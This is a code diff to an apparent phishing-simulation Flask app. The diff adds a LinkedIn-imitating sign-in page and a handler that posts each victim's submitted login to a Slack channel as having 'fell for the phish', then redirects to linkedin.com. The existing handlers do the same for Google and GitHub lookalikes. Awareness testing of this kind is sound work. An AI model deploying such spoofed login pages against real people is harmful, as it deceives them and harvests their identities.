@@ -17,6 +17,10 @@ def index():
 def login():
     return render_template('github.html', title='Home')
 
+@app.route('/signin')
+def signin():
+    return render_template('linkedin.html', title='Home')
+
 @app.route('/google', methods=['POST'])
 def google():
     client.chat_postMessage(channel=SLACK_USER, text=request.form['Email'] + " fell for the phish.")
@@ -26,4 +30,9 @@ def google():
 def github():
     client.chat_postMessage(channel=SLACK_USER, text=request.form['login'] + " fell for the phish.")
     return redirect("https://github.com", code=302)
+
+@app.route('/linkedin', methods=['POST'])
+def linkedin():
+    client.chat_postMessage(channel=SLACK_USER, text=request.form['login'] + " fell for the phish.")
+    return redirect("https://linkedin.com", code=302)
 
